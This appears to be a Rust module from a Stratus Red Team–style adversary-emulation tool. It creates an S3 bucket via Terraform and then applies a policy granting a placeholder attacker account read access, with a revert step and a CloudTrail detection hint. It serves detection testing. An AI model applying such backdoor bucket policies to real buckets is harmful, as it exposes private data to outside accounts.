use std::collections::HashMap;
use std::sync::Arc;
use anyhow::Result;

use crate::platform::Platform;
use crate::providers::CloudProviders;
use crate::tactic::MitreTactic;
use crate::technique::{AttackTechnique, BoxFuture};

const TERRAFORM: &str = r#"
terraform {
  required_providers {
    aws    = { source = "hashicorp/aws",    version = "~> 5.0" }
    random = { source = "hashicorp/random", version = "~> 3.0" }
  }
}

resource "random_string" "suffix" {
  length  = 8
  special = false
  upper   = false
}

resource "aws_s3_bucket" "target" {
  bucket        = "stratus-red-team-s3-backdoor-${random_string.suffix.result}"
  force_destroy = true
}

output "bucket_name" {
  value = aws_s3_bucket.target.bucket
}
"#;

const ATTACKER_ACCOUNT_ID: &str = "012345678901";

async fn detonate_impl(outputs: HashMap<String, String>, providers: Arc<CloudProviders>) -> Result<()> {
    let aws = providers.aws().await?;
    let bucket = outputs
        .get("bucket_name")
        .ok_or_else(|| anyhow::anyhow!("missing output: bucket_name"))?;

    let policy = serde_json::json!({
        "Version": "2012-10-17",
        "Statement": [
            {
                "Sid": "StratusRedTeamBackdoor",
                "Effect": "Allow",
                "Principal": {
                    "AWS": format!("arn:aws:iam::{}:root", ATTACKER_ACCOUNT_ID)
                },
                "Action": "s3:GetObject",
                "Resource": format!("arn:aws:s3:::{}/*", bucket)
            }
        ]
    });

    aws.s3
        .put_bucket_policy()
        .bucket(bucket)
        .policy(policy.to_string())
        .send()
        .await
        .map_err(|e| anyhow::anyhow!("{}", e))?;

    println!(
        "Applied backdoor S3 bucket policy to '{}' granting s3:GetObject to attacker account {}.",
        bucket, ATTACKER_ACCOUNT_ID
    );

    Ok(())
}

fn detonate(outputs: HashMap<String, String>, providers: Arc<CloudProviders>) -> BoxFuture<Result<()>> {
    Box::pin(detonate_impl(outputs, providers))
}

async fn revert_impl(outputs: HashMap<String, String>, providers: Arc<CloudProviders>) -> Result<()> {
    let aws = providers.aws().await?;
    let bucket = outputs
        .get("bucket_name")
        .ok_or_else(|| anyhow::anyhow!("missing output: bucket_name"))?;

    let result = aws
        .s3
        .delete_bucket_policy()
        .bucket(bucket)
        .send()
        .await;

    match result {
        Ok(_) => println!("Deleted backdoor bucket policy from '{}'.", bucket),
        Err(e) => {
            let msg = format!("{}", e);
            if msg.contains("NoSuchBucketPolicy") {
                println!("No bucket policy found on '{}' — already clean.", bucket);
            } else {
                return Err(anyhow::anyhow!("{}", e));
            }
        }
    }

    Ok(())
}

fn revert(outputs: HashMap<String, String>, providers: Arc<CloudProviders>) -> BoxFuture<Result<()>> {
    Box::pin(revert_impl(outputs, providers))
}

inventory::submit! {
    AttackTechnique {
        id: "aws.exfiltration.s3-backdoor-bucket-policy",
        friendly_name: "Backdoor S3 Bucket via Bucket Policy",
        description: "Applies a backdoor S3 bucket policy that grants a cross-account attacker s3:GetObject on all objects in the bucket. Simulates data exfiltration by giving an external account read access to sensitive S3 data.",
        detection: "CloudTrail: PutBucketPolicy with cross-account principal.",
        platform: Platform::Aws,
        mitre_tactics: &[MitreTactic::Exfiltration],
        is_idempotent: false,
        is_slow: false,
        prerequisite_tf: Some(TERRAFORM),
        detonate,
        revert: Some(revert),
    }
}
